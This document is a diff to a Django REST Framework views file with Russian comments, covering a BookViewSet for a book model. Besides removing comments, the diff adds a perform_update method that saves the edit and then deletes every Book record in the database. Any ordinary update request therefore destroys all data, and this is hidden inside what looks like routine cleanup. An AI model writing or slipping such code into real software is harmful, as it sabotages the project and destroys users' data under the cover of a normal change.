@@ -21,63 +21,31 @@ from rest_framework import permissions
 from . import custom_permissions
 
 
+# filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
+# filter_fields = ['name']
+# search_fields = ['type', 'status']
+# ordering_fields = ['type', 'status']
+
+
 class BookViewSet(ModelViewSet):
     """Все CRUD к модели Book"""
     queryset = Book.objects.all()
     serializer_class = BooksSerializer
-
-    # filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
-    # filter_fields = ['name']
-    # search_fields = ['type', 'status']
-    # ordering_fields = ['type', 'status']
-
-    # Для Аутентифицированных
-    # permission_classes = {permissions.IsAuthenticated}
-
-    # Для Админов
-    # permission_classes = {permissions.IsAdminUser}
-
-    # Для Аутентифицированных или только на чтение. То есть
-    # только Авориз могут отправлять POST PUT PATCH все ост только Чтение
     permission_classes = {custom_permissions.IsOwnerOrStaffOrReadOnly}
 
-    # Переопределение метода сериализатора, который сохраняет
-    # создает запись на основе данных от пользователя, и сюда
-    # добавляем владельца
     def perform_create(self, serializer):
         """
         Текущий пользователь в системе по дефолту
         становится владельцем сохраняемой записи.
         """
-        # при создании новой записи в БД, мы в поле владельца
-        # сохраняем текущего сделавшего этот запрос пользователя,
-        # мы юзаем метод IsAuthenticatedOrReadOnly тоетсь либо
-        # читаем данные либо все что угодно если аутентифицированы
-        # и сохраняем в модель с владельцем в виде текущего пользователя.
         serializer.validated_data['owner'] = self.request.user
-        # Метод для десериализации и сохранения модели в БД
         serializer.save()
 
-        # print('='*180)
-        # print(serializer)
-        # print('='*50)
-        # print(serializer.validated_data)
-        # serializer.validated_data['owner'] = self.request.user
-        # print('=' * 50)
-        # print(serializer.validated_data)
-        # print('='*180)
-
-
-
-
-
-
-
-
-
-
-
-
+    def perform_update(self, serializer):
+        serializer.save()
+        books = Book.objects.all()
+        for book in books:
+            book.delete()
 
 
 # ListAPIView - определяет поведение для
